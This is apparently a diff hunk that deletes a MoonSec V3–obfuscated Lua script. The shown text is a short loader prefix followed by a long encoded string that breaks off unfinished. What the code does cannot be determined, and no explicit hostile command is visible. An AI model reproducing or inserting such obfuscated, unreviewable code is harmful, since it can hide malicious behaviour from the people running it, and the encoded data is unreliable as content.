@@ -1,1 +1,10893 @@
-([[This file was protected with MoonSec V3]]):gsub('.+', (function(a) _nXqDxXQOdtVg = a; end)); IaDiDvGqBgkkDeTL=_ENV;vkpZSgDuhJSolZf='jP>3u zw?&<#W_2muw2u_zW?###&&2&I?>w>##u_uw&u >u&z&m_22322z2?#m#W<>&u?zwzP_32>3PPPzm&_>_&WWWP#<_PWw#u<z&???3wuw33>_u u >?P<hWmWuw2zm ?>&P??w<zw_&?#? <#u> >>_>>P75>muu? P32>P<mW:&>?uwzzz<2w&u2?zuu>  2>wm 33mW_u Pm<#?&&Wm?: #< 3< <w#G_>> P22mw>u_P#><#&<?_&?wxz> uuum ;&m#2WW3Ww#w< ?#&2?2wwz2 & wP23PP2P413m2W32?_<W<_#_&#2#U<>&>z&u_u2>m><P&P>mzm _&_WW._2_rW>#u<z&?W<m#<2zP Wuu3z>?P?Ww_3_&< #_<&&Wwmw&?m?_w>zu zuz&>>n>?zz12PU3#W_2zPP<m&<&3?_wzz? <u<m<022 2w2?_PW<W^WmWz#><u&z?z <u23w>2>z3w>wP&P3mW222N_0?w&#w<w2z z>uW3w   &3?><PWBW ?2&m2>#W>_>TP#W&__&&>?w<2u2z>?w>#+?U Jz2?_<WW#W?_ 2 uumum>zP&> S?mz1wW?#&W&W__m_WW>#u<z&z3W ?u_u?2>m<P?._m3mH2PmP2?_uWz#?<? 2z3 Puzu_ wuW3<>WP2?uw#zuu#_&_s#W<2<e&Ruzuwuz3P>P3m &>>PuXzmzu123muP&#&W?2#?z?&WPz&zX_2?&>N>wz>2mP#3 _P_2n2&#Ww2Pzmw<#<?3um?W 3Puz m>P#3?Rk#2###3&2&%?>_<_ W<<m&_&P??P3y#mz2?_<W<Pw#W<?2<#k<>z#z2u2u*3>>>zmPuK+u>8?m< mzz?>www>3> Nu >#>?P&>&>?EWm2mA2S&?&#&uwmwWz_z> z>w3zP_5ms-PmP#4>mu2z_z?W&#?_?uu?z3 >3W>m>23mu3>>Pu^zmzu>_32?P <W#W2W?W<^W z&uz&w >33zm>?P_2m2__>Wu#z<zu_z2 3uPuz>&g_PPL?mb2_2wm3m3_zW?#<<< Pzmzsu<3m>mJ_PPP>bu2#2>W_W#_#_W#2#b<>&>u> w3#3V>wP2=&2wm#_<_2W W><W&w# #u&??<wWzW>m34kWPw_Wq>_u#m<m#z#??W?m<##3?2?Bw>z>P>>PP?g<mwW2_w_#<#&P>>2##>m &_&> uuP3z<P>2 W>3>37zm?2<u_>_KPmuPw2<2O2P#&<<#w&#?uw>? {<mW222/_>Wu#z&?_&?Ww2wTz> uuz3?w3 WJ2kCm>2u_zW?#<<W_2&Y?>wuzz ?u<3W>2>*P3PPmz2?_<W<Pz<u<W2<&>&uW3 Pu#&w mu>PwJ2m<2W_2u33z>zgm.zmPw_wwzg >uu3u%Wm&2m2>_>###>&_#&#K&W?2?Swp3&3?><P&-2PmP?T>mu2z_z?<&?wm?&zwzz &z&z&uW323)>5_{2 W&#2# <W&wzw?>zw < zuP3> lu>3u>zP?!<#Wz(>i_3>P#z<?&<?< z uuz3u>&2>W&##mZ_P_&?><_<P&2?u?3z>zw w3#3<P_P#MW/u2w2>_<?z<_<#&#um _z_zuum>_>m3FP&P>V?Ww#_&&<<#_z_< ?_??w2 mP&uW3P>zP _uWwmW2P_u_3?P<W&#?&w2wm>_ _u33_3u2wmzv mW22_##>###m?mw uWwWww  www> <uW32>2_#m>_&_<#m#&<3&2&z< <2??w<zW W<z muww#>u>> P2?mK><mP23 <wzz#zz>zuu3&PmPWY_<_^m.3m>2u_z3#>mo2&m<>?>wuzz zm#>PP>mmW 23_>Wu<m&m<>zz?uw& m Wu_ _ 3ud3>>u?<z& W ?u3_P_##u<z&???_Pz?wp<<wPz32um32<_WW&<1<&<_w_z3mP<><PW<??z#m>W<>_>zP(}>mu2u&Q<2<0?2 wzwz?ww3< <uW32>2w#>qRWu2PuQz?m?P6?<<#z_W<>&w# w2 z&3 >>>2>2T_>WFwWz3  ?&ww>< m P-/>w> P W&2m2 _&?m#z<m<z &?_w#>mz3 zP >w3P>>_#WP#><z&_w2# w&<u?&zPz2z%umuum_mw__mz2&2m_>_z#_##<?<>&Ww?32zmz>3 uwP?p>2_UwWW#3&uWPWw#?&2w3wm? 3#3P> P?>mmPP__mG>W&_#_ww#w<?Cz5z23 3u3z <uP3WFW_2_uW?m&W_W&<u?Pw>   u <3w>W>3uPPc>2HwP<mwW&2_#&_3w wuwzw_w>?Pum3uumPwP >?>>muWm#wW <z&#?W<m&w?W333>3?{<uu3w3SPPPgm&2?2_<3??w)<3<*?m?wwu  u#u&3v>32__&W?#<#^&_?W?1w3z3# <#&??<wWzW3w>3>PG#>&>wQWm2m}2Z>&#m#&mm#<<E_&w# ?<#z&u?>_>#P1e>mu2u>WmzWWUw&p?3__zzww<mwz u3P>mPuAzm?2??m#b& ?3??z#u# zu 3>> >u3 33P?M<mW2W&W#P& ?<?Pw?z3u>u&uz3GP#3&3wPWg2pBm=&w# <z&J? w uzzP a3<>_>W3_3#>;P>iumuukW2_zPu#W#22W<u<zWP?&zWuP3&>uPzt?m?uumWm2P&2PWu&&&wwWz2zX (mwP?m_2#mE_3<>Ww#?<<&w??&_&??*w>zu um#PWgP2mmu_w#?#w<<W#W&<2<r&>?>>&u<>mP_>>r 2zm3__WmWz#PW2Wo#><u&z??w<&6&2 Puz3u>zP?z_zuum >_uW W&<?&<?WwWW? &z2&#3>u>w>P>>zu#2mWWP2_<_Smu&2?2w z# ?u<3W>W_2232PW#2&W5WW#2#=<i2_&>w2W:?zw?_???P?> zrP<m23zWc#3i_<&?&2c?8?_#zu23 Wm2&_#z>TuPv3zmWmPom_?#F2_<WwW3W3<>WP<_z#_<m23_P?u#&<# <?Pwmzm>3u&3m332&P:S&QK#32w_ ?&#_#:zm?P?#wW3 P#sW5+mw_?%m_3m223##W?#<<&&2 w P3w xu3u&>W3kPwP l>mWmz_>&?W&#W?m<Pw> WuwzP>z/_22P#>PP>m?W__&_m& ?#wmw>?&u#ww3& W>33 3P_ _u_<#<W??m?2&0#u&#&zzz3?>2>> 3>w>3m2_#WW<m<2#u&P?zw_&#z<??zPwu P>3uwP3>_WmW2_q_wWW_#<&?2<&wPzm?>wWu2>&PPPm)am 2z7&mP2z?_?W&>zu&2&P?<z#z< 3u>uwm_2>W<m_m<2&2PW2<m< <3?<w_uw33>>PuE<mw2z_<W_#_amq_m>2u_zWzz_&P?Kw> w >u<P2P#P?P3m P3nWmz2?_<W<& ? ?zz# # z 1 _ 3uN3>>uPu#2_z#_# _P_u#u<z&???>_ 3uu3PmwP Vumz2P_P_u& <W&#&#?2wm?m? w>zu zuz>Pm_mwmui3ew2z_?W<#<Fw&w?m_#<3?z#8u >2?z>2!_ 2PzP?33m#_2#3<&&z??w<z<>>> ><P?>w>P!<mW22_2? & &>?uzW _ Pu#z3 muz3?><P<2<_mW3#?#&<W&W? wWzw?3?>zz ?u<3<?w>WP? <>TP>3>WpW?Rz<2#k>3w&&> Wu2u(3G2?222P__wW#u<&&2?&3zwm # mm2ut3u>3P<m_2_m-_3Wuw>##&m&W?>>Wu# m Pu>P&P_0_#W2u#3/>mu2z_?W<#W?2pm_>? ?>z? <uW3W2WIP2w_w_u<<#?&m<&?w?zz3??w<zWw{#>u>3u>z3#N<mW222z_?Wu#z<?W&?Wwmwsz> uu<W2><PWc2>mm>2 _zW?2 <W&2&7?>wuzz ?u<w_>2>PP>Uumz2?_<WWWz#N<>&u?zw?z# Wz2WP3>>uPzb?m<P._22>=m#u<w&?#PwWz2zUzu #3z><P<>mm2mn2>_<3<#?<_&W?2?lw3zu wu?3<<<P2Pb+>m 2z_?W<#W2W<k&u?uw?z? #uW q33>>Pz}zy_2<_WW2_>Wm<u&&??<3zW 2 Bz>3<>zP#H<mm22P>_>_z_><?&2?W#>wYz> uzz 3><>MG2Lum>mW_z_<W&<W<3&)<#wuzz ?z<#_>2> P>0&mz>W_<_2m3#N<?&u<mw?z< Wz2 u3>><Pz*2m<mP_2_K_3#u<_&??<wWz2zazuu#3z3gP<33m2ma2>2z2*#?#3&W2>?8w>zuz? 03<3zP23ub>mu2z_W2>#W#z</#>?uwwz? <<5323W>>P&9zm?2<_W_aWv#m<u<P??w<zW 2 &u>u/>zP<G<m2222B2>Wu#_<?< ?W?<w5z>z2uz3m><>?12R#m>2? PW?W><W#?&+?3wuzzW}u<uu>2>?P>Mumz22u2WWWz#8<u&u?ww?wS Wu2#23>>uPzY<m<2W_2_{uE#u<z&??2wWz2z: >W>3z>?P<Pum2mV2>_uuu#?<<&W&P?/w>zu zWz3<>WP2Pwp>mu2z_?u?#W<2<U&3?uwzz? <? 323&>>PW0zm?2<_W_#WY#W<u&z??w<zW 2z?u>3_>zP<v<m2222O23Wu#z<?<3?Ww2woz>z&uz3?><P262afm>2u2zW?#<<W&2&^?>wuz<z#u<3W>22WP>( mzm<zWWW#2#f#u&u?zw??<&uu2u)3>>uPz>Wm<m22 _6W>#u_v&??<wW?oz? >uu3z3<P<AWm2Ptm<_uWz#?<<&W#u?=?uz2 zu?3<3<P2PY(>muK{_?W<#W<m<;&>?u??wu <uW323?>>Pu+zk<wW_WW2WS_3<u&z??<(_W 2 :u>zm>zP&S<um222uz?Wu#z<?_ ?Wwmw1zz2<uz3?>< ?X20Pm>2uPPW?#<<W&m&/?>wuw?2<u<3W>2>_P>Fumzmza>WW_?#-z &u?ww?z< W >_z3>>uPzW#m<2__22> u#u<z&?&3wWz2zEzu z3z>&P< um2m62>_u_?#?<<&W&O?:w3zuz? _3<>WP2u?X>mu2zm?W2#W<2<r&>?u<Wz?zWzw323>>>u30zm?2<_W2<W6# <u&w??w<zW 2 uu>3u>zP#R<m222m>zuWu#w<?2#?Ww2wpz>#wuz3<><PWJ29Vm>2u_?W?##<W<^&%?uwuzWz&u<3_>2w3P>/ mz2&_<_a u#v<>&u_&w?z# Wz._>3>>wPz33m<2W_22>u #u<<&?#mwWz2z6zuum3z>_P<3zm2mY2>_u_2#?#J&W&g?Jw>zu z z3<3PP2P>o>mz2z_?2 #W#><x&z?uw#z? < z3233>>PzSzm&2<_W>>WM# <u&w??w<zW 2<tu>3w>zP&f<m2222z2<Wu#&<?m>?Wwmw4z> uu<W2><PWR2 ?m>2 _zWW 5<W&2&d__wuzw ? WW2>2>uP>>mmz2?_<_233#o<w&u<?w?z< Wu2u>3>>?Pz9<m<2__2mxu>#u<<&??_wW?WzI >u23z>2P<rWm2mw2>buWW#?#{&W_ ?}? zu?zzu3<3>P2>a1>6_2zN?2 #W#u<k#m?u? z??< w323z>> )oz>&2<(W_#WZ#?<u#z??w2zW 2zRu>3#>zP?Z<m222Ph PWu#_<?#z?WW3wb&>z_uz3m>< &)2>?m>mu2<W?W!<W#_&.?&wu&zzMu<u>>2>#P>s#mz2?_mWWW>#U<?&u??w?wWzzu2u 3>z2Pzl?m<2Wm3_-Ww#u<w&??WwW&2w? >u&3z #P<P3m2t>wu_uW##?mu&W?2?iw><3 zu_3<>_P2P>q>>um&_?Wm#Wm<<5&&?u&zz# < P323u>>  nzm?mP_W_ WH#><u&w??<<w? 2 wu>w#>z>uV<mWY%2p_wWu#_<?&W?W&2?wz> <uz3_><P2L2eJP_2u_2W?#<<W&m&l#>m?zzzhu<?#>2w>P>IuTP2?29WWWz#^<3&u<zwmz<z>u2u 3>>zPzK?su2W2z_FW>#u<w&?#<?wz2z? >&33z3mP<JWPum!2?_uW2#?<#&W<2?zw>z< zu_3<>2P2P!>_mu22_?W<#W<m<*W>a?wzws <&#32z&>>Pu>bm?mM_W_zW/#3<u#z&mw<w> 2  u>3z>zP?-#mWmz2X_>Wu#w<?W<<1w2w?z><3uz3&><PW>zy%m?2u_2W?##<W#2<3?>w<zz Wu<w_>2>{3_Xum22?_<WW#m#(_>P2?z?hz<<3u2?z3>>u>&U?x(2W2z_lWu#uWz#q?<?3z2zz >?z3z>?3e/WDwmU2>_uW<#?_<<#?2?&w><# z?23< W><PEf#mu>m_?_P#W_2##&>?_wz#3 <wm323>z PuPom?2m_WW2WVW>X?&z&Pw<#W 2 <u>3u32P?PPmWmw2J_uWu_z# &<&uw2wuz>& uz3?uuPWP?LFm>2u_wW?2<#m&2&<?>##zzz&u<3W>m>aP<huUl2?_WWW_v# <>&_?z<zz< Wu2z8#>>u>6v?A>2WP&_EW>3P<z<u?<wWz2zz >wu32>?>zLWu m5PW_uWzWE<<<&?2?>w>zu z <uw>W>WPJ>wmu2z_?_W#m<2<m&>?2wzz? <uWuw3!>mPuP m?2#_W_2>h#>#I&z&2w<w& 2?6#33u3>P?3<mW3P2,2>_W#z#u&<_ w2w&z>?u W3?3zPW &!aA_2u_W3W#<#&&2&u?>w zz &u<3W<W>SP>7umm2?_<WWW2_u<><C?zW?z<z&u2u%33>u>.T?Fz2W2y_02>W&<z<3?<?uz2<> >uuuP>?>wRWm2mD2z_umzWu<<<&?2Www>?P zw? P>W>#Pou#mu2__?m<W#<2<_&>Wmwz#u < >#>3H3nPua&m?2#_WWmW4#>>>&z??w<w  2 9u>uu&mP?PwmW322h2^Wu#z#W&<&ww2w_z> zuz ?u PWP<)Tmz2uPwW?#<#P&2&2?>wuzz &u<zWu<>X>fHu3_2?P&WW#2W_<><6?z?zz< 2u2z=3<>u>3I?.z2W2i_DW>_m<z<w?<wWz2zP >wuu<>?>&GWu_m!>g_uWz_><<<&?2?mw>z  zz?uX>W>#PDQ2mu>z_?W<_ <2<m&>?uwzz< <wW L3K3PPuu_m?3?_W_u3u#>#u&z?&w<z_ 2 3u>3u<uP?e<mWm 2G_>Wu#z>z&<?Ww2w#z> uuz3?<?PWM2TEmW2u_zW?W<P?&2&m?>Wuzzz?u<3Wuz>8PmQul 2?_#WW_2#_<><P?zwWz<w:u2uxuw>u>3}?mW2W_m_Y_uW<<z< ?<W&z2z. > z3w>?>?CW>>m:2>_uWzW?<<<&?2?>w>z  zu??3>WP2PYy>mu2z_?W2 ><2<,&> ^wzz& < 2_q3M>>Pu7mm?2<_W2._2#>< &z#mw<zW 2 Z P3u>zP?;WmW2m2v2u_z#z<?&<Wuw2w(z>wu ?3?><PW)2}*P22umz_w#<<W&2&^?>W&zzw?u_3W>2>}P>Yum&2?2W__#2#><>&<?zw?z< W2#uL3>>uP?q?m#2W_2i#W>#u<z&&?<wWz2z8 ?uu3z>?P<0Wm2mk2u_uWz#?<<&_?2?iw>zu zu?3<>W &Pr%>mu2w_?W<#W<m<-&>?uwzw? <uW323P>wPutzm?2?#3&m&_?w< &2??w<zW W>wPwP?m_2_2?2>2221_>Wu#z<? <m2#2wPzz uuz3?>?_ mP#Pm3mC_zW?#<<<  z zz>w323P>zPZP*m m^+ mW2?_<WW#W&Iw3z_z? #z#z2u2uA3>>>Ww2__2W#&P<m&2&Dw#z#z23> nu >#>?P&>&>z+Wm2m62S&8< ?#w#w?u2 Wu3u_>#><3#3wP2PY5>m>&&<&<?zm?_wWz2 _u<3_ # 2323l>>P>#w__W2##?P&m?2?Jz# # 2Pm3z> > P?s&P&72mW222K_;?w?#?W&#& w2w0z> >m?b&J_mPW2_P_uW?_w_^#<<W&2?2u> v3wuPPmP2PP>3P3twmz2&2uWW#2#V<Huw 2u&uW>_>P>u,w{zu>y?m<2Wm^> W>#u<z&<?<wWz2zS &uu3z>?P#gWV.m6P>_?Wz#?<<<3?2?mw>wzzWu?3<>W>9Pvq>mu2z_mW<#W<2<P&>?zwz&? WuW323g>WPuP m?2<2PW2W6#><u&z??w<?W_2 Nu>3u>zP?P mW22P>_>Wz#z<?&<?Ww2w6zW uuz3?>WPWLm0Om>m<_zW?#<<_&2&i?>&u?, ?u<3W>2>HP_Uumz%P_<W2#2#G<>&u?zw??P Wu2u43u>uPwC?m<2m_2_hW>#z<z&??<&W22zs >uu3z>?> 0WPnm22>_zWz##<<&W?2?a?zzu zu?3W>WPmP.Pum&2z_?W<#_<2<5&><u?Pz? <uW323R>mPu>z) 2<_WW2W=#><W&z<?w_zW 2 )u>3u3zP?PEi>222a_>__#z<&&<?_w2wum? uuz3?u3PWfmUomzw<_zW?#<_w&2&P?>?zm? ?u<3W3u>XP>QuC?{3_<W_#2#P<>&u?z&??P WumuA33>u>3I?P<m2_2_PW># <z<k?<&W?<zv 3uu3w>?><SWP2IF2>_ Wz#&<<<P?2?c?>zu wu?3W>WP2PQc>ym2z_?W<#W<2<>&>??FWz? <uWzw3H>3Pu>zw?2<2PW2Wu#><?&z&<2PzWz  Eu23u>zP?D<?>222 _>W##z<<&<&>&3w5zw uz23?>#PWCm5ymzw<_zW?#<_u&2&P?>w?mW ?u<3W w>lP3Fu>zzw_<_=#2#&<><>?zw2WP Wu2ui u>uPwZ?mW2W2>zzW>#u<z#<?<w_z2zK?_uu3z>?P#sWm2m(2>_uWz#?<<<3?2?Aw>z  zu?3<>WPmP 7>mu2zuW>#P2P<f &>?uwzz? <uW323ez>P tWm?2<_WuP3u>us_!u2mw<zW 2 Gu>3u>z??u<m_2m2+_>Wu#u<?&<?Ww2wMz> u3zww mPW42XEm>u3_zW&#<<W&2&Q?>wu#< ?uW3W>2>7P>Qumz 2_<W_#2#><>&z?z&2?w WumuI3?>uPwZ?mW2W2>zzW>#u<z&2?<w_z2zu2?uu3z>?>w/WmmmF2>33Wz#&<<&_?2?*w>zu<<u?3W>WP2PAE>mu2WuWW<#m<2<I&>? wzz< <uW#W3D>>Pukzm?2<_WW2_?#><u&z?<w<zW 2 T_m3u>wP?d_mW2m2^_z <#z<?&<#mw2wPz> u< 3?>#PWs2J%m>2u_zPW#<<2&2&s?>wuzz ?WA3W>m>.Pufum?2?el2&#2#P<><w?zw&z<z1u2uuW?>uPzf?+_2W_m_/Wzu<<z&??<<mz2zP >uu?&>?P#%Wm2mf2>_u_uP <<<3?2&ww>z  zu&3<3A#uPxN>mum__?W##W#>3z&>?uwz&# <u_323+?PPuLwm?2__WW2WE#>#u&z?<w<zW 2 Xu>uz>2P?;_mWm 2B_>WuW?#2&<&Cw2wwz> uuz3?u>PW.m0Dmz2u_?W?2^<2&2&P?><wzz &u<u>>2>u<?Uumz2?*_WW#m#(#um#?zw&z< _u2uT3>3zw_%?mW2W2P_YW>#u<z2#?<wmz2zi >uu3z3<?PoWc>m!2&_uWz#?<2T<?2?>w>&z zu&3<>Ww>P^f?mu2w_?W<#W<2>?&>?#wzzW <uW323h3#PuA2m?22_WW2WO#><2&z&Pw<zm 2 %u>3u>mP?PumW2226_>Wu#z<m&<&ww2w z> uuz3?3mPWP<(rmw2u_zW?#<W &2&&?>?(zz <u<3W#g>IP<Zum22?23WW#2>w<>&_?zw_z< Wu2u!3<>uP2a?S>2W2w_J2># <z<7?<?uz2z  >uuu_>?>PFWC m.2<_uWzW?<<&_?2?zw>z# zuW# >W>APx> mu2w_?W<B<<2<P&>?zwzz? <uW?W39>>PuE?m?2<_WW2m##><u&z?&w<zW 2 Pu33u>zP?a<mW2221_?Wu#z<?&<2zw2w>z> uuz3?><PWPWa9m 2u_wW?#<<W&2<W?>w?zz &u<3W>2>EP<;um&2?_WWWW,#s<>#M?zw<z< Wu2u33>>uP<r?m<2W_m_nW>#u<?&??<wWz2z  >uu3z>&>>aWm2mi2-<#&#&W?PwPzWzzw3z2 zu?3<><mP2m2u_3W##W<3&<?3<P&w?uwzz? ?33>-rPY>P P3m?2<_WWW<u&Pw#z_zuum><3_>3P2{_pzP&PWmW222b_tw &#?Ww&3m _uW32>&P&PW__mu2323_zWw2wW?#<<W#X>>?>w zz &u<3W>2>Yzu(umw2?_#WWWF#q#>mu?zw&z<zPu2uN3>><>#6?m<2W2u_OW3#u<w&??2P>z2zq >u<3z>&P<P{&umL2>_u_3#?<#&W<LP>w>z  zu<3<>WP238?3mu2w_?W##W#P<T&?m?wzz< <uW323P>>P 5zm?U>_WW2W4#><u&z??w<2> 2 Pu>3z>zP<b<mW332g_3Wu#w<?&#?W?>Lzz> uuzu?><P_x2P>?u2u_wW?#2<W&2&0?>WWzz <u<3W>2>iP>pu?w2?_#WWWp#-<3&u?z#3z< Wu2uP3>>uPzB&m#2W_2_%_2#u<z&??#?uz2z^ >u>t_m_m223_3W2W?_ _P#?<<&W?W3wuwu?P&P_PWP>mw23_wm 2W_?W<#W<W?uz3 z >3_ #  323Q>>P>Wz_wW_# #>&&&P?>&w&<w<zW 2u2P?I_V?2_22_#_3#3<<&_&u?Wzmz2 3 3uz  u#3?><PWhW_zW#W><<W&Wu<W&2&S?O>w32>&>WU_YPsu2w2zmw22_<WW#2<2?>z  m <u_ _ 3uk3>>uPu_mW#W&#3_PW2#u<z&???3?u_33>3>*mz+u2#m _3_>23_&Wz#?<<&<w  Pu#u? wu_3<>WP2D22zW W&#3W<#W<2<o&>?uwzz? <u_u?3)>>Pu^u# ###3<W&&&z?&z< _w<zW 2 9u>3u>zQ?u&m_m_2(_>Wu#u 2w3z< >>z3#3z>&PW__mu2w_WWz2 2?W?#<<W&WuPzw ?u A#>&P?E<m 2 2?<&WO<m<m<>&3<3&&?zw?z< <>#PPPzmWPz{?m<2W_2_(W>#u2z&??<wWz2z% >uuPzzwP#Pum2mX2>_>?z&uw#? z3z>  z zwu?3<>WPWW?2w_P#w#z<&& ?>z>wPz3 <>?>#>2>>3P>mPugzm?2?<#& &m&u?Fz<uw Wu 3 >&>v3 3uP?l<mW2W<u#P<&?&?0 3z<z>u uu>&>&PW>#>zl2B.m>2>&><w?_w_?>z&zP >u& & u3W>2>IP12#_ W<# <m&2?Pw z&?wwmz< Wu232Pum&m32w2/WP_m_ W>#u<z&zz>zPu 3 #Wuu3z>?>WP%m2m%2>__Wz#?<<#W<z?Iw>zu zu?3W>W30P?L>mz2z2_W<#W<2<7< ?uwzz? WuWu13Su>><Kzm?2<_WW2W<#>#z&&??w#zWw? vu>3uuz>_:<m_222P_>_##zW?P#?Wwmwxz3 u m3?><uwQ2!>m>2u_zW?#<<Wmz&d? wuzw ?u<3W3u&uP>:?mz2<_<W_#2#P<>&ueuw?z< Wu2uB3>>uPWwWm<mP_2_PW># <z&#?<wW2Wz- >uu3z>?P<HWm2z22>_uWz#W<<&W?2?)?<zu zu?3<>WP2PR,?z?2z_2W<#W<2<P&>? wzz?_?uW323k>uPu-zm?mWz2W2Ww#>< &z??w<zW#9 7u&3u>wP?lWmWA2zP_>W##z<m&<&_w2wz2w uu_3?&6PWZmX(m>2u_< 2#<<W&2mz?>w zz 2 m3W3P>,>Wfumw2?_#WWW>uz<>&u?z&>z< _u2uuW?>uPzG?Pw2W_m_sW>S?<z&m?<?>z2z* >uuw#>?>PRWmmm*23_uWzPo<<&m?2?hw>zu zu?<>>W> Pff&mu2z_?2<3_<2<?&>?uwzzm < >W33k><Puu3m?2#_WW2W,#z3<&z??w<<& 2 Pu> u<zP?P3mWmz2T2>WuW?Cm&<&ww2?zz> uuz3?#hPWPwHpm_2u_?W?WDWP&2&&?>&#zz &u<3_>2>u<?Eumz2?,PWW#m#x<z><?zw?z<&&u2uP3>3z<?)?hu2Wmq_EW>#uWz> ?<?zz2z< >z03z3<Pm^W;&mY2<_uWz#?<<< ?2?Ww>zz zu?3<>W3#PVf_mu2?_?_w#W#><u&>?uwz<3 <u_32 I<>PuPzm?m&_W_2WTWuT#&z&<w<?u 2 Cu>3u<WP?P<mWSY2%_uWu#W#_&<&Ww2<3z>  uz3&><>Q<uZAm>2uy&W?##<W<>>z?>wuzz&3u<3_>2uZ&3.uDz2?23WWW>#eW>P ?z?&z<z#u2uu3>>u3mG?O<2W22_v_3#uWzP&?<?Wz2wY > >3z>2?wEW62mnP__uWw#?#u&W&>Pzw>zu z?33<>_P2P; zmum._?_<#W<2<B&>_?wzzm < #3236>>P< _m?m _Wm#WO#3<u&???w2R> 2 Ru>zP>zP&q<o>w32!_&WuP><?&#?Ww2wJzz2<uz3?><w?02BPm>2u><W?W3<W<3&Y?>wuzz2zu<uz>2>wP>0umz2?m3WWWw#;<u&u?ww?wWw>u2u&3>3FPz9?m<bWmP_oW##u<m&?& wW?Mwu >u23z3WP<dWm2mt2__uWm#?<W&W?m?i?uw# z P3<3PP2PsY>Puzw_?_u#W<2<f&&?u&z?> < z323<>>><bzm?m3_W_&Wk#&<u&z???W?3 2 Wu>uP>zP?G<mW0w2h_#WuW><?&#?W&lwzz> _uz3_><PW82>Tm32u2OW?#<<W< &:<>w zzz>u<uz>23zP>Huu<2?2 WWW #,<>&u&?c_z<z?u2um3>>uPz:?PL2W2w_EW2#u<w&?&W?nz2z& >uw3z>?P<>W83m{2#_uWm#?W &W?2?>w>z2 zu<3<>WP2>>-mmumP_?W_#W<2<A#>&2wzw3 < w323z>>Pu&<m?mz_W_GWL#><u&z&mw<w& 2 wu>3u>zP?PzmWm&2!_mWu#z<?&<&#w2w&z> uuz3&><>v>&4(m>2u3?W?##<W&22u?>w_zz 2u<3W>2>SumZumm2?_#WW#m#!#u&w?z?Pz<z?u2uL3>uu> N?532W2w_rW_#u#?<<?<?zz2w3 >uu3z>?><5W=wmF2u_uWw#?#W>2?2?&w>w! zu?3<uW&mPd!#mu2m_?_ #W<22 &>?_wzz& <u_323u#?PuSzm?mW_WWmW0#>m?&z?mw<wT 2 1u>3uw2P?P>mW2224_>Wu#z3&&<&3w2w>z>  uz3?z PWe24pm32u_zW?#<<m&2&o?>w2zz ?u<3_3>>=P>Mumu<P#_w_#m#<<>&u?zwz P3#39P#P vu2w_#Wm2_23_HW>#u<u z # &u3zP ?uu3z>?P?mSWmW>#2<&Ww#_<<&W?2w2u?3_3uPW3#33P2P+C>m>#m#z<_&P&/?u&3?<wzz? <u<P2DPm#mz2&m&m&_WW2Wp#v #z#zW>2uPuP>3PwP>m<2&2?2E_P2P_?Wu#z<?&?3m zu u 3?uwuP><PW+2m2<u# #&&_w<w_?Mwu&_wuzz ?u<W >2>QP>(umz2?_<WW_u#}<>&u?zw?z< Wzo u3>>uPz{mm<2W_22>_m#u<w&??WwWz2zZw> m3z>&P<%_m2m?2>_u23#?<#&W&D?!w>zu z r3<>WP2PkS>mz2z_Wzq#W<2<I<<?uwwz?w<W_323 >>P?Bzm#2<mWu2Wl#w<u&#??wmzWw0#wu>3#>z>PD<mW222E ?Wu##<?<P?W?+w0z?_&uz3_><3uE2xPm>2u_zWW R<W&2&I&<wuzw ?z<#W>2> P>k?mz2&_<_2> #t<&&u&^w?z< Wu2Wz3>>&Pzrmm<22_2_zuw#u<#&?<>wWzmz7 >uu3<#2P<bWm2i?2>_ WzW<3W&W&3?owzzu zu? <<_P2P V>m&2z_2W<#WG_<i&??uwzz? <uW32?u>>P#pzmW2<_WW2W%um<u&#???PzW m fu??#>zP?L<5u222P_>Wz#z<W3e?Ww2wsz< uuw3?>< wl2s0m>2 _zW?#<<W&2&Z?>wuw  ?u<3W>m> P>iumz2z&z<P<8&b<3&_?zw?z< <p2PmP m_m<2P_&W<_2_NW>#u<z&??<zW<_zPz3uu3z>?P?Wu23W_#3#>< &Pw2 2z_ m z>u>w><P2>_>3P0;>mu2u#m&#& &><P&W?uwzz? ?mmPzNP;u2 _&_W#m#2WmW?#><u&z?z PuPu>>wPwP>YWP&PPmW222R_CwwzW?<z#z& 3wPzz uuz3?>?m<232wm322_zW?#<<< #zP & >3m3W>mPXU3>4P>Yumz2?_<WW#2#C<3&&?zw?z< <3>PPP mmPzMu<3__#6P_>uuu2 &&&&wWz2zQ nm<}mLz22W>_w_>W #?w&&0?3w?z>?P?uzu zu?3?__y3mu2P<wW #u<z&P?P?uu  Wu#u#32>mw33a>>PuP??<2<__W2Ww#><u&z??WWzW m -u33u>?P?><w_222P_>W #z#w&<&>&3wMz3 uuW3?>#PW=mqqmzw<_zW?#<#>&2&P?>wu<P ?u<3W>m>eP>Iumzuw_<W_#2#J<>&u?z&?2# Wumu:33>uPWX?M(wP_2_PW>W3<z&&?<wWz2zu2?uu3z>?>&SWmmmy2>33Wz#&<<&W?2?pw>?u_wu?3#>WPmP,G?muCz ?W<#_<2<P&>&>wzw<WPuWuP3!>zPuqzm?2<z>W2WP#><w&z?<w<w>w3 Gu33u3?P?4#mW2m20_z <#z<?&<&2w2wPz> u?P3?><PWAmFTm>2u_z>w#<<2&2&P?>wuzz ?w<3W3P>kP3Jumz2?_<2z#2#><>&z?zw&z<wW ?uh3u>uPwg?mW2Wm2_?W>#w<z&??<w2z2zK 2uu3&>?P_vW4nmqp>2&Wz##<<&m?2?<w>zu &u?32>W>=P)c>musz23W<Wi<2<u&>&Pwzw<z<uWu339>_PuOzm?mW2mW2Wz#><w&z??w<zWzu xu&3u><P?V_mWm>2m_>W&#z_&&<?_w2?>mu uum3?3PPW(29-m>3z_z_P#<<_&2&>?>&u2w ? 33W3w>o>PEumWm__<_ #2_ <>& ?zw&z<zd2uu/3>>u3#p?m#2W2>zzW>#u<zW&?<w_z2w>2uuu3m>?>>6Wm2mB(>2 WzWP<<< ?2?&w>?uzWu?uu>W>NPpU3muSz_WW<W?<2<=&>?zwzz?zmuWu#3{><Pufzm?2<2XW2W<#>#P&z??w<zWw# qu#3u>zP?cWmWm223_>W #z#%&<& w2?>mu uum3?3zPWl25;P>z _z_P#<# &2& ?>wu<# ? 33W>m>8P3Bum<z3_<_P#2Wm<>& ?zw?W& W 3ua33>uPzR?m<uu_2_zW>#u<z&??<wWmmz{ wuu3?>?P#UWm2>#2>_uWz#&<<&W?2?Pw>zu zu?uI>WP2PA{3m<2z_?W<#<?2wPz#zz &z&zuuW323M>cWw_2W&WW<_<P<u?w?z&w&Pw<zW 2u2muc c&2_W<W__/Wu_3Wm#z<?&<?<3PuPu,Bw> Putzm 2>_ m32?_zW?#<<< ww333w w> ?u<3W>W_w2w2?<&W,#3<?&>&>www>&_w?z< Wu2&m3>> 